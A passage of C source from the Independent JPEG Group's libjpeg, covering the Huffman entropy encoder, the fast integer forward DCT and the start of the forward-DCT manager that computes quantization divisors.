    /* For a negative input, want temp2 = bitwise complement of abs(input) */
    /* This code assumes we are on a two's complement machine */
    temp2--;
  }
  
  /* Find the number of bits needed for the magnitude of the coefficient */
  nbits = 0;
  while (temp) {
    nbits++;
    temp >>= 1;
  }
  /* Check for out-of-range coefficient values.
   * Since we're encoding a difference, the range limit is twice as much.
   */
  if (nbits > MAX_COEF_BITS+1)
    ERREXIT(state->cinfo, JERR_BAD_DCT_COEF);
  
  /* Emit the Huffman-coded symbol for the number of bits */
  if (! emit_bits(state, dctbl->ehufco[nbits], dctbl->ehufsi[nbits]))
    return FALSE;

  /* Emit that number of bits of the value, if positive, */
  /* or the complement of its magnitude, if negative. */
  if (nbits)			/* emit_bits rejects calls with size 0 */
    if (! emit_bits(state, (unsigned int) temp2, nbits))
      return FALSE;

  /* Encode the AC coefficients per section F.1.2.2 */
  
  r = 0;			/* r = run length of zeros */
  
  for (k = 1; k < DCTSIZE2; k++) {
    if ((temp = block[jpeg_natural_order[k]]) == 0) {
      r++;
    } else {
      /* if run length > 15, must emit special run-length-16 codes (0xF0) */
      while (r > 15) {
	if (! emit_bits(state, actbl->ehufco[0xF0], actbl->ehufsi[0xF0]))
	  return FALSE;
	r -= 16;
      }

      temp2 = temp;
      if (temp < 0) {
	temp = -temp;		/* temp is abs value of input */
	/* This code assumes we are on a two's complement machine */
	temp2--;
      }
      
      /* Find the number of bits needed for the magnitude of the coefficient */
      nbits = 1;		/* there must be at least one 1 bit */
      while ((temp >>= 1))
	nbits++;
      /* Check for out-of-range coefficient values */
      if (nbits > MAX_COEF_BITS)
	ERREXIT(state->cinfo, JERR_BAD_DCT_COEF);
      
      /* Emit Huffman symbol for run length / number of bits */
      i = (r << 4) + nbits;
      if (! emit_bits(state, actbl->ehufco[i], actbl->ehufsi[i]))
	return FALSE;

      /* Emit that number of bits of the value, if positive, */
      /* or the complement of its magnitude, if negative. */
      if (! emit_bits(state, (unsigned int) temp2, nbits))
	return FALSE;
      
      r = 0;
    }
  }

  /* If the last coef(s) were zero, emit an end-of-block code */
  if (r > 0)
    if (! emit_bits(state, actbl->ehufco[0], actbl->ehufsi[0]))
      return FALSE;

  return TRUE;
}


/*
 * Emit a restart marker & resynchronize predictions.
 */

LOCAL(boolean)
emit_restart (working_state * state, int restart_num)
{
  int ci;

  if (! flush_bits(state))
    return FALSE;

  emit_byte(state, 0xFF, return FALSE);
  emit_byte(state, JPEG_RST0 + restart_num, return FALSE);

  /* Re-initialize DC predictions to 0 */
  for (ci = 0; ci < state->cinfo->comps_in_scan; ci++)
    state->cur.last_dc_val[ci] = 0;

  /* The restart counter is not updated until we successfully write the MCU. */

  return TRUE;
}


/*
 * Encode and output one MCU's worth of Huffman-compressed coefficients.
 */

METHODDEF(boolean)
encode_mcu_huff (j_compress_ptr cinfo, JBLOCKROW *MCU_data)
{
  huff_entropy_ptr entropy = (huff_entropy_ptr) cinfo->entropy;
  working_state state;
  int blkn, ci;
  jpeg_component_info * compptr;

  /* Load up working state */
  state.next_output_byte = cinfo->dest->next_output_byte;
  state.free_in_buffer = cinfo->dest->free_in_buffer;
  ASSIGN_STATE(state.cur, entropy->saved);
  state.cinfo = cinfo;

  /* Emit restart marker if needed */
  if (cinfo->restart_interval) {
    if (entropy->restarts_to_go == 0)
      if (! emit_restart(&state, entropy->next_restart_num))
	return FALSE;
  }

  /* Encode the MCU data blocks */
  for (blkn = 0; blkn < cinfo->blocks_in_MCU; blkn++) {
    ci = cinfo->MCU_membership[blkn];
    compptr = cinfo->cur_comp_info[ci];
    if (! encode_one_block(&state,
			   MCU_data[blkn][0], state.cur.last_dc_val[ci],
			   entropy->dc_derived_tbls[compptr->dc_tbl_no],
			   entropy->ac_derived_tbls[compptr->ac_tbl_no]))
      return FALSE;
    /* Update last_dc_val */
    state.cur.last_dc_val[ci] = MCU_data[blkn][0][0];
  }

  /* Completed MCU, so update state */
  cinfo->dest->next_output_byte = state.next_output_byte;
  cinfo->dest->free_in_buffer = state.free_in_buffer;
  ASSIGN_STATE(entropy->saved, state.cur);

  /* Update restart-interval state too */
  if (cinfo->restart_interval) {
    if (entropy->restarts_to_go == 0) {
      entropy->restarts_to_go = cinfo->restart_interval;
      entropy->next_restart_num++;
      entropy->next_restart_num &= 7;
    }
    entropy->restarts_to_go--;
  }

  return TRUE;
}


/*
 * Finish up at the end of a Huffman-compressed scan.
 */

METHODDEF(void)
finish_pass_huff (j_compress_ptr cinfo)
{
  huff_entropy_ptr entropy = (huff_entropy_ptr) cinfo->entropy;
  working_state state;

  /* Load up working state ... flush_bits needs it */
  state.next_output_byte = cinfo->dest->next_output_byte;
  state.free_in_buffer = cinfo->dest->free_in_buffer;
  ASSIGN_STATE(state.cur, entropy->saved);
  state.cinfo = cinfo;

  /* Flush out the last data */
  if (! flush_bits(&state))
    ERREXIT(cinfo, JERR_CANT_SUSPEND);

  /* Update state */
  cinfo->dest->next_output_byte = state.next_output_byte;
  cinfo->dest->free_in_buffer = state.free_in_buffer;
  ASSIGN_STATE(entropy->saved, state.cur);
}


/*
 * Huffman coding optimization.
 *
 * We first scan the supplied data and count the number of uses of each symbol
 * that is to be Huffman-coded. (This process MUST agree with the code above.)
 * Then we build a Huffman coding tree for the observed counts.
 * Symbols which are not needed at all for the particular image are not
 * assigned any code, which saves space in the DHT marker as well as in
 * the compressed data.
 */

#ifdef ENTROPY_OPT_SUPPORTED


/* Process a single block's worth of coefficients */

LOCAL(void)
htest_one_block (j_compress_ptr cinfo, JCOEFPTR block, int last_dc_val,
		 long dc_counts[], long ac_counts[])
{
  int temp;
  int nbits;
  int k, r;
  
  /* Encode the DC coefficient difference per section F.1.2.1 */
  
  temp = block[0] - last_dc_val;
  if (temp < 0)
    temp = -temp;
  
  /* Find the number of bits needed for the magnitude of the coefficient */
  nbits = 0;
  while (temp) {
    nbits++;
    temp >>= 1;
  }
  /* Check for out-of-range coefficient values.
   * Since we're encoding a difference, the range limit is twice as much.
   */
  if (nbits > MAX_COEF_BITS+1)
    ERREXIT(cinfo, JERR_BAD_DCT_COEF);

  /* Count the Huffman symbol for the number of bits */
  dc_counts[nbits]++;
  
  /* Encode the AC coefficients per section F.1.2.2 */
  
  r = 0;			/* r = run length of zeros */
  
  for (k = 1; k < DCTSIZE2; k++) {
    if ((temp = block[jpeg_natural_order[k]]) == 0) {
      r++;
    } else {
      /* if run length > 15, must emit special run-length-16 codes (0xF0) */
      while (r > 15) {
	ac_counts[0xF0]++;
	r -= 16;
      }
      
      /* Find the number of bits needed for the magnitude of the coefficient */
      if (temp < 0)
	temp = -temp;
      
      /* Find the number of bits needed for the magnitude of the coefficient */
      nbits = 1;		/* there must be at least one 1 bit */
      while ((temp >>= 1))
	nbits++;
      /* Check for out-of-range coefficient values */
      if (nbits > MAX_COEF_BITS)
	ERREXIT(cinfo, JERR_BAD_DCT_COEF);
      
      /* Count Huffman symbol for run length / number of bits */
      ac_counts[(r << 4) + nbits]++;
      
      r = 0;
    }
  }

  /* If the last coef(s) were zero, emit an end-of-block code */
  if (r > 0)
    ac_counts[0]++;
}


/*
 * Trial-encode one MCU's worth of Huffman-compressed coefficients.
 * No data is actually output, so no suspension return is possible.
 */

METHODDEF(boolean)
encode_mcu_gather (j_compress_ptr cinfo, JBLOCKROW *MCU_data)
{
  huff_entropy_ptr entropy = (huff_entropy_ptr) cinfo->entropy;
  int blkn, ci;
  jpeg_component_info * compptr;

  /* Take care of restart intervals if needed */
  if (cinfo->restart_interval) {
    if (entropy->restarts_to_go == 0) {
      /* Re-initialize DC predictions to 0 */
      for (ci = 0; ci < cinfo->comps_in_scan; ci++)
	entropy->saved.last_dc_val[ci] = 0;
      /* Update restart state */
      entropy->restarts_to_go = cinfo->restart_interval;
    }
    entropy->restarts_to_go--;
  }

  for (blkn = 0; blkn < cinfo->blocks_in_MCU; blkn++) {
    ci = cinfo->MCU_membership[blkn];
    compptr = cinfo->cur_comp_info[ci];
    htest_one_block(cinfo, MCU_data[blkn][0], entropy->saved.last_dc_val[ci],
		    entropy->dc_count_ptrs[compptr->dc_tbl_no],
		    entropy->ac_count_ptrs[compptr->ac_tbl_no]);
    entropy->saved.last_dc_val[ci] = MCU_data[blkn][0][0];
  }

  return TRUE;
}


/*
 * Generate the best Huffman code table for the given counts, fill htbl.
 * Note this is also used by jcphuff.c.
 *
 * The JPEG standard requires that no symbol be assigned a codeword of all
 * one bits (so that padding bits added at the end of a compressed segment
 * can't look like a valid code).  Because of the canonical ordering of
 * codewords, this just means that there must be an unused slot in the
 * longest codeword length category.  Section K.2 of the JPEG spec suggests
 * reserving such a slot by pretending that symbol 256 is a valid symbol
 * with count 1.  In theory that's not optimal; giving it count zero but
 * including it in the symbol set anyway should give a better Huffman code.
 * But the theoretically better code actually seems to come out worse in
 * practice, because it produces more all-ones bytes (which incur stuffed
 * zero bytes in the final file).  In any case the difference is tiny.
 *
 * The JPEG standard requires Huffman codes to be no more than 16 bits long.
 * If some symbols have a very small but nonzero probability, the Huffman tree
 * must be adjusted to meet the code length restriction.  We currently use
 * the adjustment method suggested in JPEG section K.2.  This method is *not*
 * optimal; it may not choose the best possible limited-length code.  But
 * typically only very-low-frequency symbols will be given less-than-optimal
 * lengths, so the code is almost optimal.  Experimental comparisons against
 * an optimal limited-length-code algorithm indicate that the difference is
 * microscopic --- usually less than a hundredth of a percent of total size.
 * So the extra complexity of an optimal algorithm doesn't seem worthwhile.
 */

GLOBAL(void)
jpeg_gen_optimal_table (j_compress_ptr cinfo, JHUFF_TBL * htbl, long freq[])
{
#define MAX_CLEN 32		/* assumed maximum initial code length */
  UINT8 bits[MAX_CLEN+1];	/* bits[k] = # of symbols with code length k */
  int codesize[257];		/* codesize[k] = code length of symbol k */
  int others[257];		/* next symbol in current branch of tree */
  int c1, c2;
  int p, i, j;
  long v;

  /* This algorithm is explained in section K.2 of the JPEG standard */

  MEMZERO(bits, SIZEOF(bits));
  MEMZERO(codesize, SIZEOF(codesize));
  for (i = 0; i < 257; i++)
    others[i] = -1;		/* init links to empty */
  
  freq[256] = 1;		/* make sure 256 has a nonzero count */
  /* Including the pseudo-symbol 256 in the Huffman procedure guarantees
   * that no real symbol is given code-value of all ones, because 256
   * will be placed last in the largest codeword category.
   */

  /* Huffman's basic algorithm to assign optimal code lengths to symbols */

  for (;;) {
    /* Find the smallest nonzero frequency, set c1 = its symbol */
    /* In case of ties, take the larger symbol number */
    c1 = -1;
    v = 1000000000L;
    for (i = 0; i <= 256; i++) {
      if (freq[i] && freq[i] <= v) {
	v = freq[i];
	c1 = i;
      }
    }

    /* Find the next smallest nonzero frequency, set c2 = its symbol */
    /* In case of ties, take the larger symbol number */
    c2 = -1;
    v = 1000000000L;
    for (i = 0; i <= 256; i++) {
      if (freq[i] && freq[i] <= v && i != c1) {
	v = freq[i];
	c2 = i;
      }
    }

    /* Done if we've merged everything into one frequency */
    if (c2 < 0)
      break;
    
    /* Else merge the two counts/trees */
    freq[c1] += freq[c2];
    freq[c2] = 0;

    /* Increment the codesize of everything in c1's tree branch */
    codesize[c1]++;
    while (others[c1] >= 0) {
      c1 = others[c1];
      codesize[c1]++;
    }
    
    others[c1] = c2;		/* chain c2 onto c1's tree branch */
    
    /* Increment the codesize of everything in c2's tree branch */
    codesize[c2]++;
    while (others[c2] >= 0) {
      c2 = others[c2];
      codesize[c2]++;
    }
  }

  /* Now count the number of symbols of each code length */
  for (i = 0; i <= 256; i++) {
    if (codesize[i]) {
      /* The JPEG standard seems to think that this can't happen, */
      /* but I'm paranoid... */
      if (codesize[i] > MAX_CLEN)
	ERREXIT(cinfo, JERR_HUFF_CLEN_OVERFLOW);

      bits[codesize[i]]++;
    }
  }

  /* JPEG doesn't allow symbols with code lengths over 16 bits, so if the pure
   * Huffman procedure assigned any such lengths, we must adjust the coding.
   * Here is what the JPEG spec says about how this next bit works:
   * Since symbols are paired for the longest Huffman code, the symbols are
   * removed from this length category two at a time.  The prefix for the pair
   * (which is one bit shorter) is allocated to one of the pair; then,
   * skipping the BITS entry for that prefix length, a code word from the next
   * shortest nonzero BITS entry is converted into a prefix for two code words
   * one bit longer.
   */
  
  for (i = MAX_CLEN; i > 16; i--) {
    while (bits[i] > 0) {
      j = i - 2;		/* find length of new prefix to be used */
      while (bits[j] == 0)
	j--;
      
      bits[i] -= 2;		/* remove two symbols */
      bits[i-1]++;		/* one goes in this length */
      bits[j+1] += 2;		/* two new symbols in this length */
      bits[j]--;		/* symbol of this length is now a prefix */
    }
  }

  /* Remove the count for the pseudo-symbol 256 from the largest codelength */
  while (bits[i] == 0)		/* find largest codelength still in use */
    i--;
  bits[i]--;
  
  /* Return final symbol counts (only for lengths 0..16) */
  MEMCOPY(htbl->bits, bits, SIZEOF(htbl->bits));
  
  /* Return a list of the symbols sorted by code length */
  /* It's not real clear to me why we don't need to consider the codelength
   * changes made above, but the JPEG spec seems to think this works.
   */
  p = 0;
  for (i = 1; i <= MAX_CLEN; i++) {
    for (j = 0; j <= 255; j++) {
      if (codesize[j] == i) {
	htbl->huffval[p] = (UINT8) j;
	p++;
      }
    }
  }

  /* Set sent_table FALSE so updated table will be written to JPEG file. */
  htbl->sent_table = FALSE;
}


/*
 * Finish up a statistics-gathering pass and create the new Huffman tables.
 */

METHODDEF(void)
finish_pass_gather (j_compress_ptr cinfo)
{
  huff_entropy_ptr entropy = (huff_entropy_ptr) cinfo->entropy;
  int ci, dctbl, actbl;
  jpeg_component_info * compptr;
  JHUFF_TBL **htblptr;
  boolean did_dc[NUM_HUFF_TBLS];
  boolean did_ac[NUM_HUFF_TBLS];

  /* It's important not to apply jpeg_gen_optimal_table more than once
   * per table, because it clobbers the input frequency counts!
   */
  MEMZERO(did_dc, SIZEOF(did_dc));
  MEMZERO(did_ac, SIZEOF(did_ac));

  for (ci = 0; ci < cinfo->comps_in_scan; ci++) {
    compptr = cinfo->cur_comp_info[ci];
    dctbl = compptr->dc_tbl_no;
    actbl = compptr->ac_tbl_no;
    if (! did_dc[dctbl]) {
      htblptr = & cinfo->dc_huff_tbl_ptrs[dctbl];
      if (*htblptr == NULL)
	*htblptr = jpeg_alloc_huff_table((j_common_ptr) cinfo);
      jpeg_gen_optimal_table(cinfo, *htblptr, entropy->dc_count_ptrs[dctbl]);
      did_dc[dctbl] = TRUE;
    }
    if (! did_ac[actbl]) {
      htblptr = & cinfo->ac_huff_tbl_ptrs[actbl];
      if (*htblptr == NULL)
	*htblptr = jpeg_alloc_huff_table((j_common_ptr) cinfo);
      jpeg_gen_optimal_table(cinfo, *htblptr, entropy->ac_count_ptrs[actbl]);
      did_ac[actbl] = TRUE;
    }
  }
}


#endif /* ENTROPY_OPT_SUPPORTED */


/*
 * Module initialization routine for Huffman entropy encoding.
 */

GLOBAL(void)
jinit_huff_encoder (j_compress_ptr cinfo)
{
  huff_entropy_ptr entropy;
  int i;

  entropy = (huff_entropy_ptr)
    (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_IMAGE,
				SIZEOF(huff_entropy_encoder));
  cinfo->entropy = (struct jpeg_entropy_encoder *) entropy;
  entropy->pub.start_pass = start_pass_huff;

  /* Mark tables unallocated */
  for (i = 0; i < NUM_HUFF_TBLS; i++) {
    entropy->dc_derived_tbls[i] = entropy->ac_derived_tbls[i] = NULL;
#ifdef ENTROPY_OPT_SUPPORTED
    entropy->dc_count_ptrs[i] = entropy->ac_count_ptrs[i] = NULL;
#endif
  }
}
/*
 * jfdctfst.c
 *
 * Copyright (C) 1994-1996, Thomas G. Lane.
 * This file is part of the Independent JPEG Group's software.
 * For conditions of distribution and use, see the accompanying README file.
 *
 * This file contains a fast, not so accurate integer implementation of the
 * forward DCT (Discrete Cosine Transform).
 *
 * A 2-D DCT can be done by 1-D DCT on each row followed by 1-D DCT
 * on each column.  Direct algorithms are also available, but they are
 * much more complex and seem not to be any faster when reduced to code.
 *
 * This implementation is based on Arai, Agui, and Nakajima's algorithm for
 * scaled DCT.  Their original paper (Trans. IEICE E-71(11):1095) is in
 * Japanese, but the algorithm is described in the Pennebaker & Mitchell
 * JPEG textbook (see REFERENCES section in file README).  The following code
 * is based directly on figure 4-8 in P&M.
 * While an 8-point DCT cannot be done in less than 11 multiplies, it is
 * possible to arrange the computation so that many of the multiplies are
 * simple scalings of the final outputs.  These multiplies can then be
 * folded into the multiplications or divisions by the JPEG quantization
 * table entries.  The AA&N method leaves only 5 multiplies and 29 adds
 * to be done in the DCT itself.
 * The primary disadvantage of this method is that with fixed-point math,
 * accuracy is lost due to imprecise representation of the scaled
 * quantization values.  The smaller the quantization table entry, the less
 * precise the scaled value, so this implementation does worse with high-
 * quality-setting files than with low-quality ones.
 */

#ifdef DCT_IFAST_SUPPORTED


/*
 * This module is specialized to the case DCTSIZE = 8.
 */

#if DCTSIZE != 8
  Sorry, this code only copes with 8x8 DCTs. /* deliberate syntax err */
#endif


/* Scaling decisions are generally the same as in the LL&M algorithm;
 * see jfdctint.c for more details.  However, we choose to descale
 * (right shift) multiplication products as soon as they are formed,
 * rather than carrying additional fractional bits into subsequent additions.
 * This compromises accuracy slightly, but it lets us save a few shifts.
 * More importantly, 16-bit arithmetic is then adequate (for 8-bit samples)
 * everywhere except in the multiplications proper; this saves a good deal
 * of work on 16-bit-int machines.
 *
 * Again to save a few shifts, the intermediate results between pass 1 and
 * pass 2 are not upscaled, but are represented only to integral precision.
 *
 * A final compromise is to represent the multiplicative constants to only
 * 8 fractional bits, rather than 13.  This saves some shifting work on some
 * machines, and may also reduce the cost of multiplication (since there
 * are fewer one-bits in the constants).
 */

#ifdef CONST_BITS
#undef CONST_BITS
#endif
#define CONST_BITS  8


/* Some C compilers fail to reduce "FIX(constant)" at compile time, thus
 * causing a lot of useless floating-point operations at run time.
 * To get around this we use the following pre-calculated constants.
 * If you change CONST_BITS you may want to add appropriate values.
 * (With a reasonable C compiler, you can just rely on the FIX() macro...)
 */

#ifdef FIX_0_541196100
#undef FIX_0_541196100
#endif
#if CONST_BITS == 8
#define FIX_0_382683433  ((INT32)   98)		/* FIX(0.382683433) */
#define FIX_0_541196100  ((INT32)  139)		/* FIX(0.541196100) */
#define FIX_0_707106781  ((INT32)  181)		/* FIX(0.707106781) */
#define FIX_1_306562965  ((INT32)  334)		/* FIX(1.306562965) */
#else
#define FIX_0_382683433  FIX(0.382683433)
#define FIX_0_541196100  FIX(0.541196100)
#define FIX_0_707106781  FIX(0.707106781)
#define FIX_1_306562965  FIX(1.306562965)
#endif


/* We can gain a little more speed, with a further compromise in accuracy,
 * by omitting the addition in a descaling shift.  This yields an incorrectly
 * rounded result half the time...
 */

#ifndef USE_ACCURATE_ROUNDING
#undef DESCALE
#define DESCALE(x,n)  RIGHT_SHIFT(x, n)
#endif


/* Multiply a DCTELEM variable by an INT32 constant, and immediately
 * descale to yield a DCTELEM result.
 */

#ifdef MULTIPLY
#undef MULTIPLY
#endif
#define MULTIPLY(var,const)  ((DCTELEM) DESCALE((var) * (const), CONST_BITS))


/*
 * Perform the forward DCT on one block of samples.
 */

GLOBAL(void)
jpeg_fdct_ifast (DCTELEM * data)
{
  DCTELEM tmp0, tmp1, tmp2, tmp3, tmp4, tmp5, tmp6, tmp7;
  DCTELEM tmp10, tmp11, tmp12, tmp13;
  DCTELEM z1, z2, z3, z4, z5, z11, z13;
  DCTELEM *dataptr;
  int ctr;
  SHIFT_TEMPS

  /* Pass 1: process rows. */

  dataptr = data;
  for (ctr = DCTSIZE-1; ctr >= 0; ctr--) {
    tmp0 = dataptr[0] + dataptr[7];
    tmp7 = dataptr[0] - dataptr[7];
    tmp1 = dataptr[1] + dataptr[6];
    tmp6 = dataptr[1] - dataptr[6];
    tmp2 = dataptr[2] + dataptr[5];
    tmp5 = dataptr[2] - dataptr[5];
    tmp3 = dataptr[3] + dataptr[4];
    tmp4 = dataptr[3] - dataptr[4];
    
    /* Even part */
    
    tmp10 = tmp0 + tmp3;	/* phase 2 */
    tmp13 = tmp0 - tmp3;
    tmp11 = tmp1 + tmp2;
    tmp12 = tmp1 - tmp2;
    
    dataptr[0] = tmp10 + tmp11; /* phase 3 */
    dataptr[4] = tmp10 - tmp11;
    
    z1 = MULTIPLY(tmp12 + tmp13, FIX_0_707106781); /* c4 */
    dataptr[2] = tmp13 + z1;	/* phase 5 */
    dataptr[6] = tmp13 - z1;
    
    /* Odd part */

    tmp10 = tmp4 + tmp5;	/* phase 2 */
    tmp11 = tmp5 + tmp6;
    tmp12 = tmp6 + tmp7;

    /* The rotator is modified from fig 4-8 to avoid extra negations. */
    z5 = MULTIPLY(tmp10 - tmp12, FIX_0_382683433); /* c6 */
    z2 = MULTIPLY(tmp10, FIX_0_541196100) + z5; /* c2-c6 */
    z4 = MULTIPLY(tmp12, FIX_1_306562965) + z5; /* c2+c6 */
    z3 = MULTIPLY(tmp11, FIX_0_707106781); /* c4 */

    z11 = tmp7 + z3;		/* phase 5 */
    z13 = tmp7 - z3;

    dataptr[5] = z13 + z2;	/* phase 6 */
    dataptr[3] = z13 - z2;
    dataptr[1] = z11 + z4;
    dataptr[7] = z11 - z4;

    dataptr += DCTSIZE;		/* advance pointer to next row */
  }

  /* Pass 2: process columns. */

  dataptr = data;
  for (ctr = DCTSIZE-1; ctr >= 0; ctr--) {
    tmp0 = dataptr[DCTSIZE*0] + dataptr[DCTSIZE*7];
    tmp7 = dataptr[DCTSIZE*0] - dataptr[DCTSIZE*7];
    tmp1 = dataptr[DCTSIZE*1] + dataptr[DCTSIZE*6];
    tmp6 = dataptr[DCTSIZE*1] - dataptr[DCTSIZE*6];
    tmp2 = dataptr[DCTSIZE*2] + dataptr[DCTSIZE*5];
    tmp5 = dataptr[DCTSIZE*2] - dataptr[DCTSIZE*5];
    tmp3 = dataptr[DCTSIZE*3] + dataptr[DCTSIZE*4];
    tmp4 = dataptr[DCTSIZE*3] - dataptr[DCTSIZE*4];
    
    /* Even part */
    
    tmp10 = tmp0 + tmp3;	/* phase 2 */
    tmp13 = tmp0 - tmp3;
    tmp11 = tmp1 + tmp2;
    tmp12 = tmp1 - tmp2;
    
    dataptr[DCTSIZE*0] = tmp10 + tmp11; /* phase 3 */
    dataptr[DCTSIZE*4] = tmp10 - tmp11;
    
    z1 = MULTIPLY(tmp12 + tmp13, FIX_0_707106781); /* c4 */
    dataptr[DCTSIZE*2] = tmp13 + z1; /* phase 5 */
    dataptr[DCTSIZE*6] = tmp13 - z1;
    
    /* Odd part */

    tmp10 = tmp4 + tmp5;	/* phase 2 */
    tmp11 = tmp5 + tmp6;
    tmp12 = tmp6 + tmp7;

    /* The rotator is modified from fig 4-8 to avoid extra negations. */
    z5 = MULTIPLY(tmp10 - tmp12, FIX_0_382683433); /* c6 */
    z2 = MULTIPLY(tmp10, FIX_0_541196100) + z5; /* c2-c6 */
    z4 = MULTIPLY(tmp12, FIX_1_306562965) + z5; /* c2+c6 */
    z3 = MULTIPLY(tmp11, FIX_0_707106781); /* c4 */

    z11 = tmp7 + z3;		/* phase 5 */
    z13 = tmp7 - z3;

    dataptr[DCTSIZE*5] = z13 + z2; /* phase 6 */
    dataptr[DCTSIZE*3] = z13 - z2;
    dataptr[DCTSIZE*1] = z11 + z4;
    dataptr[DCTSIZE*7] = z11 - z4;

    dataptr++;			/* advance pointer to next column */
  }
}

#endif /* DCT_IFAST_SUPPORTED *//*
 * jcdctmgr.c
 *
 * Copyright (C) 1994-1996, Thomas G. Lane.
 * This file is part of the Independent JPEG Group's software.
 * For conditions of distribution and use, see the accompanying README file.
 *
 * This file contains the forward-DCT management logic.
 * This code selects a particular DCT implementation to be used,
 * and it performs related housekeeping chores including coefficient
 * quantization.
 */


/* Private subobject for this module */

typedef struct {
  struct jpeg_forward_dct pub;	/* public fields */

  /* Pointer to the DCT routine actually in use */
  forward_DCT_method_ptr do_dct;

  /* The actual post-DCT divisors --- not identical to the quant table
   * entries, because of scaling (especially for an unnormalized DCT).
   * Each table is given in normal array order.
   */
  DCTELEM * divisors[NUM_QUANT_TBLS];

#ifdef DCT_FLOAT_SUPPORTED
  /* Same as above for the floating-point case. */
  float_DCT_method_ptr do_float_dct;
  FAST_FLOAT * float_divisors[NUM_QUANT_TBLS];
#endif
} my_fdct_controller;

typedef my_fdct_controller * my_fdct_ptr;


/*
 * Initialize for a processing pass.
 * Verify that all referenced Q-tables are present, and set up
 * the divisor table for each one.
 * In the current implementation, DCT of all components is done during
 * the first pass, even if only some components will be output in the
 * first scan.  Hence all components should be examined here.
 */

METHODDEF(void)
start_pass_fdctmgr (j_compress_ptr cinfo)
{
  my_fdct_ptr fdct = (my_fdct_ptr) cinfo->fdct;
  int ci, qtblno, i;
  jpeg_component_info *compptr;
  JQUANT_TBL * qtbl;
  DCTELEM * dtbl;

  for (ci = 0, compptr = cinfo->comp_info; ci < cinfo->num_components;
       ci++, compptr++) {
    qtblno = compptr->quant_tbl_no;
    /* Make sure specified quantization table is present */
    if (qtblno < 0 || qtblno >= NUM_QUANT_TBLS ||
	cinfo->quant_tbl_ptrs[qtblno] == NULL)
      ERREXIT1(cinfo, JERR_NO_QUANT_TABLE, qtblno);
    qtbl = cinfo->quant_tbl_ptrs[qtblno];
    /* Compute divisors for this quant table */
    /* We may do this more than once for same table, but it's not a big deal */
    switch (cinfo->dct_method) {
#ifdef DCT_ISLOW_SUPPORTED
    case JDCT_ISLOW:
      /* For LL&M IDCT method, divisors are equal to raw quantization
       * coefficients multiplied by 8 (to counteract scaling).
       */
      if (fdct->divisors[qtblno] == NULL) {
	fdct->divisors[qtblno] = (DCTELEM *)
	  (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_IMAGE,
				      DCTSIZE2 * SIZEOF(DCTELEM));
      }
      dtbl = fdct->divisors[qtblno];
      for (i = 0; i < DCTSIZE2; i++) {
	dtbl[i] = ((DCTELEM) qtbl->quantval[i]) << 3;
      }
      break;
#endif
#ifdef DCT_IFAST_SUPPORTED
    case JDCT_IFAST:
      {
	/* For AA&N IDCT method, divisors are equal to quantization
	 * coefficients scaled by scalefactor[row]*scalefactor[col], where
	 *   scalefactor[0] = 1
	 *   scalefactor[k] = cos(k*PI/16) * sqrt(2)    for k=1..7
	 * We apply a further scale factor of 8.
	 */
#ifdef CONST_BITS
#undef CONST_BITS
#endif
#define CONST_BITS 14
	static const INT16 aanscales[DCTSIZE2] = {
	  /* precomputed values scaled up by 14 bits */
	  16384, 22725, 21407, 19266, 16384, 12873,  8867,  4520,
	  22725, 31521, 29692, 26722, 22725, 17855, 12299,  6270,
	  21407, 29692, 27969, 25172, 21407, 16819, 11585,  5906,
	  19266, 26722, 25172, 22654, 19266, 15137, 10426,  5315,
	  16384, 22725, 21407, 19266, 16384, 12873,  8867,  4520,
	  12873, 17855, 16819, 15137, 12873, 10114,  6967,  3552,
	   8867, 12299, 11585, 10426,  8867,  6967,  4799,  2446,
	   4520,  6270,  5906,  5315,  4520,  3552,  2446,  1247
	};
	SHIFT_TEMPS

	if (fdct->divisors[qtblno] == NULL) {
	  fdct->divisors[qtblno] = (DCTELEM *)
	    (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_IMAGE,
					DCTSIZE2 * SIZEOF(DCTELEM));
	}
	dtbl = fdct->divisors[qtblno];
	for (i = 0; i < DCTSIZE2; i++) {
	  dtbl[i] = (DCTELEM)
	    DESCALE(MULTIPLY16V16((INT32) qtbl->quantval[i],
				  (INT32) aanscales[i]),
		    CONST_BITS-3);
	}
      }
      break;
#endif
#ifdef DCT_FLOAT_SUPPORTED
    case JDCT_FLOAT:
      {
	/* For float AA&N IDCT method, divisors are equal to quantization
	 * coefficients scaled by scalefactor[row]*scalefactor[col], where
	 *   scalefactor[0] = 1
	 *   scalefactor[k] = cos(k*PI/16) * sqrt(2)    for k=1..7
	 * We apply a further scale factor of 8.
	 * What's actually stored is 1/divisor so that the inner loop can
	 * use a multiplication rather than a division.
	 */
	FAST_FLOAT * fdtbl;
	int row, col;
	static const double aanscalefactor[DCTSIZE] = {
	  1.0, 1.387039845, 1.306562965, 1.175875602,
	  1.0, 0.785694958, 0.541196100, 0.275899379
	};

	if (fdct->float_divisors[qtblno] == NULL) {
	  fdct->float_divisors[qtblno] = (FAST_FLOAT *)
	    (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_IMAGE,
					DCTSIZE2 * SIZEOF(FAST_FLOAT));
	}
	fdtbl = fdct->float_divisors[qtblno];
	i = 0;
	for (row = 0; row < DCTSIZE; row++) {
	  for (col = 0; col < DCTSIZE; col++) {
	    fdtbl[i] = (FAST_FLOAT)
	      (1.0 / (((double) qtbl->quantval[i] *
		       aanscalefactor[row] * aanscalefactor[col] * 8.0)));
	    i++;
	  }
	}
      }
      break;
#endif
    default:
      ERREXIT(cinfo, JERR_NOT_COMPILED);
      break;
    }
  }
}


/*
 * Perform forward DCT on one or more blocks of a component.
 *
 * The input samples are taken from the sample_data[] array starting at
 * position start_row/start_col, and moving to the right for any additional
 * blocks. The quantized coefficients are returned in coef_blocks[].
 */

METHODDEF(void)
forward_DCT (j_compress_ptr cinfo, jpeg_component_info * compptr,
	     JSAMPARRAY sample_data, JBLOCKROW coef_blocks,
	     JDIMENSION start_row, JDIMENSION start_col,
	     JDIMENSION num_blocks)
/* This version is used for integer DCT implementations. */
{
  /* This routine is heavily used, so it's worth coding it tightly. */
  my_fdct_ptr fdct = (my_fdct_ptr) cinfo->fdct;
  forward_DCT_method_ptr do_dct = fdct->do_dct;
  DCTELEM * divisors = fdct->divisors[compptr->quant_tbl_no];
  DCTELEM workspace[DCTSIZE2];	/* work area for FDCT subroutine */
  JDIMENSION bi;

  sample_data += start_row;	/* fold in the vertical offset once */

  for (bi = 0; bi < num_blocks; bi++, start_col += DCTSIZE) {
